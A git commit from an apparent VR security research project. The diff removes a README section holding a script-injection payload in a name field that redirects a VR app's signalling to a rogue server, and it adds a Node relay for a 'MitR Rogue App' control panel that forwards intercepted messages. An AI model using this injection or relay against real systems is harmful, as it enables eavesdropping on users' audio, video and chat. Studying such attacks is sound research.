6554cfb027693a69c81db3267f12628f68deb2f2
Martin Vondráček <vondracek.mar@gmail.com>
2018-09-25 17:53:11 -0400

    [WIP] Control Panel: audio, video, chat

--- README.md
+++ README.md
@@ -1,7 +1,10 @@
 # UNHcFREG-VR
 
-## UI inject
-~~~
-initDebug();UNITYVERSION='0.34.0';
-NAME="Mallory<script>signalServerURL=SIGNAL1=SIGNAL2=SIGNAL3='172.26.104.1:8090';_0x6af9[959]='ws://';connectToSignalServer();</script>"
-~~~
+# Install
+
+Run `npm install` in `web-client` directory.
+
+# Run
+
+ - Run `node .\index.js ` in `web-client` directory. Open
+ - Open [http://127.0.0.1:8080/](http://127.0.0.1:8080/) in browser.
--- web-client/index.js
+++ web-client/index.js
@@ -1,9 +1,36 @@
 'use strict';
 
-let nodeStatic = require('node-static');
-let http = require('http');
+const nodeStatic = require('node-static');
+const http = require('http');
+const WebSocket = require('ws');
+require('log-timestamp');
 
+//region Web server hosting the MitR Rogue App
 let fileServer = new(nodeStatic.Server)();
 let app = http.createServer(function(req, res) {
   fileServer.serve(req, res);
 }).listen(8080);
+//endregion
+
+
+let controlPanelWs = null; // websocket connection to the control panel
+const webSocketServer = new WebSocket.Server({port:8081});
+webSocketServer.on('connection', function(ws) {
+    ws.on('message', function(message) {
+        if(message === 'control-panel-connect'){
+            console.log('Control panel WebSocket connected');
+            if(controlPanelWs !== null){
+                console.warn('WARN', 'Previous Control panel WebSocket overwritten.')
+            }
+            controlPanelWs = ws;
+        }
+        else{
+            if(controlPanelWs.readyState !== WebSocket.OPEN){
+                console.error('ERROR','Control panel WebSocket is not open. Cannot forward: %s', message);
+                return;
+            }
+            controlPanelWs.send(message);
+            console.log('FWD: %s', message);
+        }
+    });
+});
